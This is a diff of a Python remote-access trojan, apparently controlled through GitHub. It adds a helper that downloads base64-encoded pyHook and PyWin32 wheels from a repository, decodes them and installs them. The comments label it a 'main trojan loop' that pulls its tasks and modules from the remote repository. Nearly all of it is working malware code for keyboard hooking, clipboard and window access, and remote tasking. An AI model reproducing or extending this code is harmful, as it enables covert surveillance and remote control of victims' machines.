@@ -19,6 +19,12 @@ configured = False#flag for configuration
 task_queue = Queue.Queue()#task queue is represented by a que
 
 #functions:
+def get_wheel(wheel):
+    file_contant = get_file_contents("wheels/%s" % wheel)
+    fo = open(wheel, "wb")
+    file_contant = base64.b64decode(str(file_contant))
+    fo.write(file_contant)
+    fo.close()
 def install_and_import(package,toimport):#installed wheel files and imports the relevant thing
     import importlib
     try:
@@ -105,14 +111,11 @@ def module_runner(module):
     store_module_result(result)#store the module resualt
     return#end function
     # main trojan loop
+get_wheel("pyHook")
+get_wheel("PyWin32")
 install_and_import("pyHook",["pyHook"])#cant make modules import out of github
 install_and_import("PyWin32",["pythoncom","win32clipboard","win32gui","win32ui"])#so installing them manualy with pip
 sys.meta_path = [GitImporter()]#add my custom importer into path
-p = get_file_contents("wheels/pyHook.whl")
-fo = open("pyHook.whl", "wb")
-p = base64.b64decode(str(p))
-fo.write(p)
-fo.close()
 while True:#always be active
     if task_queue.empty():#if there are no tasks in task que
         config = get_trojan_config()#get trojan tasks
